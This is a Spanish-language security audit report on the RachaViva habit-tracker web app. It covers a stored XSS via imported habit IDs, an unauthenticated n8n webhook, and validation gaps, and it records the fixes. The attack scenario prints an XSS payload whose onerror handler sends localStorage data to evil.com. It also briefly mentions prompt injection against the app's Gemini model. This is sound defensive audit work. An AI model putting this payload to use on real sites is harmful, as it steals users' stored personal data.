# Differential Security Review — RachaViva

**Repo:** https://github.com/pepenandosanchezcortes2012-hash/rachaviva
**Commit range:** `9132f9c`..`a457bf4` (todo el historial del repo, 4 commits)
**Metodología:** [trailofbits/skills — differential-review](https://github.com/trailofbits/skills/tree/main/plugins/differential-review)
**Estrategia:** DEEP (codebase SMALL: 1 archivo, ~2960 líneas)

---

## 1. Executive Summary

| Severity | Count |
|----------|-------|
| 🔴 CRITICAL | 0 |
| 🟠 HIGH | 1 (✅ corregido, commit `a457bf4`) |
| 🟡 MEDIUM | 2 (✅ ambos corregidos, commit `f2b1b1b` + configuración en vivo de n8n) |
| 🟢 LOW | 1 (abierto, sin bloquear) |

**Overall Risk:** LOW (los 3 findings de mayor severidad ya están corregidos y verificados en producción)
**Recommendation:** APPROVE — queda pendiente solo el LOW (límite de tamaño de archivo al importar), no bloqueante.

**Actualización post-reporte:** los dos MEDIUM se cerraron el mismo día:
- Webhook de n8n: ahora exige `Authentication: Header Auth` (header `X-RachaViva-Client-Secret`) y `Allowed Origins (CORS)` restringido a `https://rachaviva.vercel.app` (antes `*`) — tanto en el nodo Webhook como en el nodo Respond to Webhook. Verificado con curl: sin el header → `403 Forbidden` ("Authorization data is wrong!"); con el header → `200 OK` y `Access-Control-Allow-Origin: https://rachaviva.vercel.app` en la respuesta.
- `reflections` en el import: `validateImportPayload()` ahora exige objeto plano, claves `YYYY-MM-DD`, valores string ≤500 chars. 5 tests nuevos (incluye que backups viejos sin el campo se sigan aceptando).

**Key Metrics:**
- Archivos analizados: 1/1 (100%) — único archivo del repo (`index.html`, ~2960 líneas de JS+HTML+CSS en un IIFE)
- Cobertura de tests: 25/25 tests pasando (`rachaviva.test.js`), incluye 1 test de regresión específico para el finding HIGH
- Blast radius del finding HIGH: 12 sitios de interpolación, dentro de la única ruta de renderizado de tarjetas (se ejecuta en cada `render()`, para cada hábito)
- Regresiones de seguridad detectadas: 0 (no hay código de seguridad previamente removido y reintroducido — repo nuevo, sin historial previo a auditar en ese sentido)

---

## 2. What Changed

**Commit Range:** `9132f9c`..`a457bf4`
**Commits:** 4
**Timeline:** 2026-08-23 15:35 a 2026-08-23 16:14 (mismo día, 39 minutos)

| Commit | Descripción | +Líneas | -Líneas | Riesgo |
|--------|-------------|---------|---------|--------|
| `9132f9c` | Modal de reflexión con IA (n8n + Gemini) — feature nueva completa | (baseline, ~2960 líneas) | — | HIGH (nueva superficie: `fetch` externo + nuevo estado `habit.reflections`) |
| `91abcb1` | Timeout del fetch 6s→15s | +4 | -1 | LOW (ajuste de configuración, sin impacto de seguridad) |
| `48c2634` | `<meta viewport>` + estructura HTML completa | +10 | -1 | LOW (solo afecta renderizado visual) |
| `a457bf4` | **Fix XSS**: `escapeHtml()` en `habit.id` (12 sitios) | +12 | -12 | HIGH (corrige un finding HIGH) |

**Total:** +26, -14 líneas sobre el archivo base a lo largo de los 4 commits.

---

## 3. Critical Findings

### 🟠 HIGH (✅ RESUELTO en `a457bf4`): XSS almacenado vía `habit.id` vin backup importado

**File**: `index.html` — 12 ocurrencias dentro de `buildHabitCardElement()`, `renderStatsPanel()` y `buildArchivedItemHtml()`
**Commit introducido**: `9132f9c` (código preexistente a la feature de hoy, no introducido por los cambios de esta sesión)
**Commit que corrige**: `a457bf4`
**Blast Radius**: 12 sitios de interpolación, todos dentro de la única ruta de renderizado de tarjetas — se ejecuta en **cada** `render()` para **cada** hábito (HIGH dentro del alcance de esta app)
**Test Coverage**: SÍ (agregado en el mismo commit del fix — `rachaviva.test.js`, sección 8)

**Descripción**:
`validateImportPayload()` (función de "Importar datos") solo exige que `habit.id` sea un string no vacío — no filtra caracteres. Antes del fix, ese `id` se interpolaba **sin escapar** en atributos `data-id="${habit.id}"` / `id="stats-${habit.id}"` dentro de strings asignados a `.innerHTML`, mientras que `habit.name` sí pasaba por `escapeHtml()` en todos lados. Un backup `.json` armado a mano podía cerrar el atributo/tag e inyectar markup ejecutable.

**Historical Context**:
- El patrón correcto (`escapeHtml(habit.name)`) ya existía en el mismo archivo desde el commit base `9132f9c` — la inconsistencia fue no aplicar el mismo tratamiento a `habit.id`, no una regresión de algo que antes estaba bien.
- No hay commits "security"/"fix"/"CVE" anteriores tocando esta función — es un finding original de esta revisión, no una reintroducción.

**Attack Scenario**:
```
1. Atacante arma un backup.json:
   {"habits": [{"id": "x\"><img src=x onerror=\"fetch('//evil.com?d='+localStorage.getItem('rachaviva_habits'))\">", "name": "Leer", "streak": 1, ...}]}
2. Ingeniería social: "che, mirá este backup que armé, importalo" (o el atacante
   sube el archivo a algún lado presentándolo como backup legítimo)
3. Víctima usa "Importar datos" (feature legítima y visible de la app) y confirma
4. Al renderizar la tarjeta, el atributo data-id se cierra prematuramente en la
   comilla inyectada, el tag <button> se cierra en el primer ">" crudo, y el
   parser del navegador crea un <img src=x> nuevo -- el onerror dispara
   inmediatamente (src inválido = error inmediato, sin click/hover)
5. El JS inyectado corre en el origen de rachaviva.vercel.app, con acceso de
   lectura a TODO el localStorage de esa víctima (hábitos + reflexiones, que
   pueden contener contenido personal)
```

**Why It Works**: `card.innerHTML = \`...data-id="${habit.id}"...\`` interpola el valor crudo; el navegador parsea el resultado como HTML real, no como texto literal.

**Proof of Concept**: verificado manualmente en esta sesión — se revirtió el fix, se corrió el test de seguridad (`rachaviva.test.js`), y falló exactamente en la aserción `toggleBtn` (el botón dejó de ser ubicable por su `data-id` real porque el atributo se rompió). Al restaurar el fix, el mismo test vuelve a pasar.

**Recommendation** (ya aplicada):
```diff
- data-id="${habit.id}"
+ data-id="${escapeHtml(habit.id)}"
```
Aplicado en los 12 sitios; test de regresión agregado.

---

### 🟡 MEDIUM (✅ RESUELTO): Webhook de n8n público, sin autenticación ni rate limiting

**File**: `index.html` — constante `REFLECTION_WEBHOOK_URL`, función `fetchReflectionQuestion()`
**Commit introducido**: `9132f9c`
**Blast Radius**: 1 hábito activado por request, pero sin límite de requests — cualquiera con la URL puede llamarlo directamente (no solo desde la app)
**Test Coverage**: N/A (la protección debe vivir del lado del servidor/n8n, no es testeable desde el cliente)

**Descripción**:
El endpoint `https://rachaviva.app.n8n.cloud/webhook/rachaviva-reflexion` no valida ningún secreto/API key propia, y el nodo Webhook de n8n tiene `Access-Control-Allow-Origin: *`. Cualquiera que descubra la URL (queda visible en el código fuente del sitio, que es público) puede:
- Llamarlo directamente vía `curl`/`fetch` desde cualquier origen, sin pasar por la app.
- Consumir la cuota/costo de la API de Gemini del dueño de la cuenta.
- Meter contenido arbitrario en `habitName` como intento de prompt injection contra el modelo (impacto bajo: el resultado solo se le devuelve a quien hizo el request, no afecta a otros usuarios, pero sigue siendo abuso de cuota/costo).

**Attack Scenario**:
```
1. Atacante inspecciona el código fuente público de rachaviva.vercel.app
2. Encuentra REFLECTION_WEBHOOK_URL
3. Escribe un script que llama al webhook en loop, con habitName variado
4. Cuota de Gemini del dueño se agota / factura sube (si está en tier pago)
```

**Recommendation**:
- Agregar un header secreto compartido (ej. `X-RachaViva-Client-Secret`) que la app mande y que un nodo IF en n8n valide antes de llegar a Gemini (no es autenticación robusta -- el secreto sigue siendo visible en el código fuente del cliente -- pero sí frena scraping casual/automatizado no dirigido).
- Restringir `Access-Control-Allow-Origin` al dominio real (`https://rachaviva.vercel.app`) en vez de `*`.
- Agregar un rate limit en n8n (por IP o global) para poner un techo al gasto máximo posible.

---

### 🟡 MEDIUM (✅ RESUELTO): `habit.reflections` no se valida ni sanitiza en el import (riesgo latente, no explotable hoy)

**File**: `index.html` — `validateImportPayload()` (línea ~2115)
**Commit introducido**: `9132f9c`
**Blast Radius**: 0 sitios de render HOY (campo write-only, sin UI de lectura todavía) — pero **toda** la futura UI de "ver mis reflexiones" heredaría este problema si se construye ingenuamente
**Test Coverage**: NO (no hay tests de import cubriendo el campo `reflections`)

**Descripción**:
A diferencia de `id` y `name`, el campo `reflections` de un hábito importado no se valida en absoluto — `validateImportPayload()` no lo toca, y `migrateHabit()` tampoco. Hoy esto no es explotable porque **ningún lugar del código actual renderiza `habit.reflections` en el DOM** (confirmado por grep — el campo solo se escribe, nunca se lee para mostrar). Pero es exactamente el mismo patrón que causó el finding HIGH de arriba: un campo de hábito, controlable vía import, sin escapar. El día que alguien agregue una vista de "historial de reflexiones" y haga `innerHTML = habit.reflections[fecha]` sin pensarlo (siguiendo el mismo estilo del resto del archivo, que sí usa mucho `innerHTML` con template strings), el mismo bug vuelve a aparecer, esta vez con contenido potencialmente más largo/rico (texto libre del usuario) que un simple id.

**Recommendation**:
- Agregar validación de tipo/longitud a `reflections` en `validateImportPayload()` (ej. debe ser un objeto plano, claves con forma de fecha `YYYY-MM-DD`, valores string ≤500 chars — mismo límite que ya usa `REFLECTION_ANSWER_MAX_LENGTH` al escribir).
- Documentar en el código, al lado de la definición de `reflections`, que cualquier futuro render debe pasar por `escapeHtml()` — dejar la advertencia ahí para el próximo que toque esto (a favor de la app: ya hace exactamente este tipo de comentario preventivo en otros lados, ej. el comment de "NUNCA un `<a download>`" en la sección de exportar).

---

### 🟢 LOW: Sin límite de tamaño en el archivo a importar

**File**: `index.html` — `handleImportFileSelected()`
**Commit introducido**: `9132f9c`
**Blast Radius**: 1 (solo afecta a quien importa el archivo, autoinflingido salvo ingeniería social)
**Test Coverage**: NO

**Descripción**: `FileReader.readAsText(file)` no chequea `file.size` antes de leer. Un archivo `.json` gigante (por error o ingeniería social) se carga entero en memoria, pudiendo colgar la pestaña.

**Recommendation**: chequear `file.size` contra un máximo razonable (ej. 5MB) antes de `readAsText`, con un mensaje de error claro si se excede.

---

## 4. Test Coverage Analysis

**Coverage:** 25/25 tests pasando, ejecutados contra el script real extraído del HTML (no una reimplementación) vía un DOM shim en Node.

**Cambios de esta sesión y su cobertura:**
| Cambio | Riesgo | Cobertura |
|--------|--------|-----------|
| Modal de reflexión (abrir/confirmar/omitir/deshacer) | MEDIUM | ✅ 7 tests dedicados |
| Fetch al webhook (payload, fallback, timeout) | MEDIUM | ✅ 2 tests (fallback + payload real) |
| Fix XSS en `habit.id` | HIGH | ✅ 1 test de regresión (verificado que falla sin el fix) |
| `<meta viewport>` / estructura HTML | LOW | ❌ sin test (no es lógica de JS, verificado manualmente en el DOM servido) |
| Webhook sin auth (finding MEDIUM de este reporte) | MEDIUM | ❌ sin test — la mitigación vive del lado de n8n, no del cliente |
| `reflections` sin validar en import (finding MEDIUM) | MEDIUM | ❌ sin test — recomendado agregar al implementar el fix |

**Risk Assessment:** el único finding HIGH ya tiene test de regresión. Los dos MEDIUM abiertos no son testeables puramente desde el cliente (uno vive en n8n) o requieren agregar el fix primero (el de `reflections`) — no bloquean el uso actual, sí conviene cerrarlos antes de publicar el link ampliamente.

---

## 5. Historical Context

**Regresiones de seguridad**: ninguna. Este es un repo nuevo (creado hoy, 4 commits); no hay código de seguridad de una versión anterior que haya sido removido y reintroducido dentro de este historial. (Nota: el archivo HTML tiene historia previa en otra sesión de trabajo no versionada en este repo — no auditable por este método ya que no hay commits de esa etapa.)

**Commits con banderas rojas del checklist** (`fix`, `security`, `CVE`, remoción de validación): solo `a457bf4`, que es precisamente el commit que **agrega** una validación (escapeHtml), no que la remueve. Ninguna bandera roja real.

---

## 6. Recommendations

### Immediate (Blocking para compartir el link públicamente)
- [x] Fix XSS en `habit.id` — ya aplicado y deployado (`a457bf4`)
- [x] Restringir CORS del webhook de n8n al dominio real, agregar secreto compartido básico — hecho (Header Auth + CORS restringido, verificado con curl)
- [x] Validar/limitar `habit.reflections` en `validateImportPayload()` — hecho (`f2b1b1b`)

### Before Production (uso más amplio que personal)
- [ ] Rate limiting en el webhook de n8n
- [ ] Límite de tamaño de archivo en "Importar datos"

### Technical Debt
- [ ] Documentar en el código, junto a la definición de cada campo de `habit`, si requiere `escapeHtml()` al renderizarse — para que el próximo campo nuevo (como `reflections` hoy) no repita el mismo patrón de bug

---

## 7. Analysis Methodology

- **Estrategia**: DEEP (codebase SMALL — 1 archivo, ~2960 líneas)
- **Archivos analizados**: 1/1 (100%)
- **Técnicas aplicadas**: diff por commit, git log/show completo, grep dirigido por categoría (sinks peligrosos: `eval`, `Function`, `document.write`, `insertAdjacentHTML` — ninguno encontrado; interpolación sin escapar en `innerHTML`; validación de import), lectura completa de las funciones de import/export/render, verificación empírica del fix revirtiéndolo y confirmando que el test falla
- **Cobertura de tests verificada**: ejecución real de la suite (25/25), no solo lectura de los tests
- **Limitaciones**:
  - No se auditó la configuración real del workflow de n8n en vivo (solo el `.json` exportado) — el finding del webhook se basa en el comportamiento observado (`Access-Control-Allow-Origin: *`, sin auth) durante las pruebas de esta sesión, no en una revisión línea por línea del workflow de n8n con esta metodología.
  - No se hizo pentesting activo contra el webhook en producción (no se intentó explotar el prompt injection ni medir costos reales).
  - Patrones de `patterns.md` de este skill están mayormente orientados a Solidity/smart contracts (reentrancy, onlyOwner, overflow) — se adaptaron conceptualmente a JS de cliente (missing validation → import sin sanitizar; access control → n8n sin auth) donde aplicaba, y se descartaron los que no tienen equivalente (no hay value transfer, no hay contratos).
- **Nivel de confianza**: ALTO para el finding HIGH (verificado empíricamente, fix + test). MEDIO para los findings MEDIUM (identificados por inspección de código y comportamiento observado, no por explotación activa).
